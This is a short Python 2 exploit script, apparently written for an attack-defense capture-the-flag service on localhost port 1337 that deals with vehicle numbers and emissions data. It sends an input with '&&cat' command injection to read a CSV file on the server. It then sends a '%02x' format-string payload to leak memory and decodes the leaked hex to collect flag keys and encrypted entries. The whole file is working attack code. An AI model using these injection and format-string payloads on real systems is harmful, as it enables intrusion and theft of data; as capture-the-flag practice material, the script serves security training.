import subprocess
import socket
import sys
import time
from Crypto.Cipher import AES
from Crypto import Random

def execute_shell(command, error=''):
    return subprocess.Popen(command, shell=True,stdout=subprocess.PIPE,stdin=subprocess.PIPE,stderr=subprocess.PIPE)


ip      = "127.0.0.1"
port    = 1337
flagID  = "WV2ZZZioza"
flagID1 = flagID[:6]
flagID2 = flagID[6:]

keys    = []
encr    = []


BUFFER_SIZE = 1024
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((ip, port)) # TODO Parameter dynamisc
data = s.recv(BUFFER_SIZE)
s.send("AAVZZZ53178207512&&cat info/Fahrzeugnummern.csv&&cat info/Fahrzeugnummern.csv")

# Bigger Receive
data = ""
loop = True
while loop:
    tmp = s.recv(BUFFER_SIZE)
    if tmp.find("Emmissionswert") != -1: loop = False
    data += tmp

for line in data.splitlines():
    if line.startswith(flagID1):
        keys.append(line.split(";")[1])
#------------------------------------------------------------------------------#
data = s.recv(BUFFER_SIZE)
s.send("I ko koa bayrisch")
data = s.recv(BUFFER_SIZE)
data = s.recv(BUFFER_SIZE)
bayWord = "ASDASD"
s.send(bayWord + "%02x"*100 + bayWord)
data = s.recv(BUFFER_SIZE)
entries =  data.splitlines()[1].split("ASDASD")[3].split("32343234")
entries.remove(entries[0])

chunks, chunk_size = len(entries[0]), 2#len(entries[0])//4
tmp = []

for ent in entries:
    tmp2 = [ ent[i:i+chunk_size] for i in range(0, chunks, chunk_size) ]
    tmp.append(tmp2)

lines = []
for elem in tmp:
    tmp2 = ""
    for c in elem:
        try:
            tmp2 = chr(int(c, 16)) + tmp2
        except ValueError:
            #print("Invalid Char:" + c)
            pass
    lines.append(tmp2)

print flagID2
for line in lines:
    print line
    if line.startswith(flagID2):
        encr.append(line.split(";")[1][:-1])

print(keys)
print(encr)

s.close()
sys.exit()
